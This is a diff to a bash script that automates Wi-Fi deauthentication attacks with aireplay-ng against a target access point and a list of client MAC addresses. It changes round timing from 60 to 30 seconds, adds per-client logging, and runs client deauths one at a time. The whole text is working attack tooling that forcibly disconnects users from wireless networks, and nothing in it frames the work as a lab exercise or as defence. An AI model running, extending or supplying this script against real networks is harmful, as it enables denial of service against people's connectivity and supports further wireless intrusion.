@@ -12,7 +12,7 @@
 #     and broom with pkill patterns to avoid stragglers.
 #
 # Messages:
-#   - [AIREPLAY] waiting for beacon…
+#   - [AIREPLAY] Waiting for beacon...
 #   - [AIREPLAY] Deauths started.
 #
 # Title (updates 2×/sec):
@@ -54,7 +54,7 @@ CLIENTS_FILE=""
 SCAN_TIMEOUT=20      # seconds (full scan)
 QUICK_CONFIRM=5      # seconds (if we have a channel hint)
 SLEEP_BETWEEN=0.5
-CLIENT_ROUND_SECS=60
+CLIENT_ROUND_SECS=30
 CLIENT_CMD_TIMEOUT=10
 CLIENT_DEAUTH_COUNT=5
 
@@ -435,12 +435,18 @@ start_client_deauth_loop() {
     set -euo pipefail
     ifc="$1"; bssid="$2"; clients_file="$3"; deauth_count="$4"; round_secs="$5"; cmd_timeout="$6"
 
+    log() { printf "[CLIENT] %s\n" "$*"; }
+
     run_client_once() {
       local client="$1" ifc="$2" bssid="$3" count="$4" timeout_s="$5"
+      log "Deauth start: ${client} (${count} pkts)"
       aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$ifc" >/dev/null 2>&1 &
       local pid=$!
       (
         sleep "$timeout_s"
+        if kill -0 "$pid" 2>/dev/null; then
+          log "Timeout: ${client} (${timeout_s}s) - killing"
+        fi
         kill -INT  "$pid" 2>/dev/null || true
         sleep 0.05
         kill -TERM "$pid" 2>/dev/null || true
@@ -463,14 +469,11 @@ start_client_deauth_loop() {
         done < "$clients_file"
       fi
 
-      pids=()
+      if (( ${#clients[@]} > 0 )); then
+        log "Round start: ${#clients[@]} client(s)"
+      fi
       for c in "${clients[@]}"; do
-        run_client_once "$c" "$ifc" "$bssid" "$deauth_count" "$cmd_timeout" &
-        pids+=( "$!" )
-      done
-
-      for p in "${pids[@]}"; do
-        wait "$p" 2>/dev/null || true
+        run_client_once "$c" "$ifc" "$bssid" "$deauth_count" "$cmd_timeout"
       done
 
       round_end="$(date +%s)"
@@ -479,7 +482,7 @@ start_client_deauth_loop() {
         sleep $((round_secs - elapsed))
       fi
     done
-  ' -- "$ifc" "$bssid" "$CLIENTS_FILE" "$CLIENT_DEAUTH_COUNT" "$CLIENT_ROUND_SECS" "$CLIENT_CMD_TIMEOUT" >/dev/null 2>&1 &
+  ' -- "$ifc" "$bssid" "$CLIENTS_FILE" "$CLIENT_DEAUTH_COUNT" "$CLIENT_ROUND_SECS" "$CLIENT_CMD_TIMEOUT" &
   CLIENT_LOOP_PID="$!"
   local realpg; realpg="$(get_pgid "$CLIENT_LOOP_PID")"
   CLIENT_LOOP_PGID="-$CLIENT_LOOP_PID"; [[ -n "$realpg" ]] && CLIENT_LOOP_PGID="-$realpg"
@@ -507,7 +510,7 @@ start_deauth() {
   : > "$CH_DEAUTH_COUNT_FILE"
   [[ -f "$TOT_DEAUTH_COUNT_FILE" ]] || echo 0 > "$TOT_DEAUTH_COUNT_FILE"
 
-  echo "[AIREPLAY] Waiting for beacon on ch ${ch} for ${bssid}…"
+  echo "[AIREPLAY] Waiting for beacon on ch ${ch} for ${bssid}..."
 
   if ! iw_set_channel "$ifc" "$ch"; then
     echo "[!] Failed to set channel ${ch} (kernel may report disabled). Skipping deauth this round."
@@ -530,7 +533,7 @@ start_deauth() {
       case \"\$line\" in
         *'Waiting for beacon frame'*)
           if [ \"\$started\" -eq 0 ]; then
-            echo '[AIREPLAY] waiting for beacon…'
+            echo '[AIREPLAY] Waiting for beacon...'
           fi
           ;;
         *'Sending DeAuth'*)
